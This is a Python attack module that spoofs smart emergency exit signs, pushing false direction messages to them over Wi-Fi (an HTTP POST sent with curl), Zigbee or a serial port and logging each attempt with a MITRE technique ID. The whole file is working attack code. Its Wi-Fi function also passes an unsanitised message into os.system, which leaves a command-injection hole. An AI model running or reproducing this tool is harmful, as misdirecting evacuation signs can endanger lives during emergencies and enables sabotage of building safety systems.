#!/usr/bin/env python3
# modules/attacks/exit_sign_spoofer.py

import os
import json
import time
import argparse
from datetime import datetime
from subprocess import run

LOG_FILE = "results/exit_sign_spoof_log.json"
MITRE_TTP = "T1557.002"

def log_event(protocol, target, payload):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "protocol": protocol,
        "target": target,
        "payload": payload,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def spoof_wifi_sign(ip, message):
    cmd = f"curl -X POST http://{ip}/update_display -d 'msg={message}'"
    os.system(cmd)
    log_event("Wi-Fi", ip, message)
    print(f"[✓] Message sent to sign at {ip}")

def spoof_zigbee_sign(interface, device_id, message):
    run(["zigbee-cli", "--iface", interface, "--target", device_id, "--write", message])
    log_event("Zigbee", device_id, message)
    print(f"[✓] Zigbee spoofed message: {message}")

def spoof_serial_sign(port, message):
    with open(port, "w") as f:
        f.write(message)
    log_event("Serial", port, message)
    print(f"[✓] Serial exit sign updated.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof smart emergency exit signs with false directions")
    parser.add_argument("--method", choices=["wifi", "zigbee", "serial"], required=True)
    parser.add_argument("--target", required=True, help="IP, device ID or serial port")
    parser.add_argument("--msg", required=True, help="Message to spoof (e.g., ← RIGHT)")
    args = parser.parse_args()

    if args.method == "wifi":
        spoof_wifi_sign(args.target, args.msg)
    elif args.method == "zigbee":
        spoof_zigbee_sign("zb0", args.target, args.msg)
    elif args.method == "serial":
        spoof_serial_sign(args.target, args.msg)
